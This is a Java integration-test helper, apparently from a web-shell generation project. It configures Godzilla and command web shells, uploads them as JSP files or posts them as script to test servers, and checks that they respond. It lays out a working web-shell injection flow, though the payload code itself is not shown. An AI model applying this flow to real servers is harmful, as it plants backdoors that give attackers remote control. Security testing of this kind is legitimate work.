package com.reajason.javaweb.integration;

import com.reajason.javaweb.config.CommandShellConfig;
import com.reajason.javaweb.config.GodzillaShellConfig;
import com.reajason.javaweb.config.Server;
import com.reajason.javaweb.config.ShellTool;
import com.reajason.javaweb.memsell.packer.Packer;
import lombok.extern.slf4j.Slf4j;

/**
 * @author ReaJason
 * @since 2024/12/5
 */
@Slf4j
public class ShellAssertionTool {
    public static void testShellInjectAssertOk(String url, Server server, String shellType, ShellTool shellTool, int targetJdkVersion, Packer.INSTANCE packer) {
        String shellUrl;
        switch (shellTool) {
            case Godzilla:
                String pass = "pass" + shellType;
                String key = "key" + shellType;
                String headerValue = "Godzilla" + shellType + packer.name();
                GodzillaShellConfig shellConfig = GodzillaShellConfig.builder()
                        .pass(pass).key(key)
                        .headerName("User-Agent").headerValue(headerValue)
                        .build();
                log.info("generated {} godzilla with pass: {}, key: {}, headerValue: {}", shellType, pass, key, headerValue);
                String godzillaContent = GodzillaShellTool.generate(server, shellConfig, shellType, targetJdkVersion, packer);
                shellUrl = assertInjectIsOk(url, shellType, shellTool, godzillaContent, packer);
                GodzillaShellTool.testIsOk(shellUrl, shellConfig);
                break;
            case Command:
                String paramName = "Command" + shellType + packer.name();
                CommandShellConfig config = CommandShellConfig.builder().paramName(paramName).build();
                String commandContent = CommandShellTool.generate(server, config, shellType, targetJdkVersion, packer);
                log.info("generated {} command shell with paramName: {}", shellType, config.getParamName());
                shellUrl = assertInjectIsOk(url, shellType, shellTool, commandContent, packer);
                CommandShellTool.testIsOk(shellUrl, config);
        }
    }

    public static String assertInjectIsOk(String url, String shellType, ShellTool shellTool, String content, Packer.INSTANCE packer) {
        String shellUrl = url + "/";
        if (Packer.INSTANCE.JSP.equals(packer)) {
            String uploadEntry = url + "/upload";
            String filename = shellType + shellTool + ".jsp";
            shellUrl = url + "/" + filename;
            VulTool.uploadJspFileToServer(uploadEntry, filename, content);
            VulTool.urlIsOk(shellUrl);
        } else if (Packer.INSTANCE.ScriptEngine.equals(packer)) {
            String uploadEntry = url + "/js";
            VulTool.postJS(uploadEntry, content);
        }
        return shellUrl;
    }
}
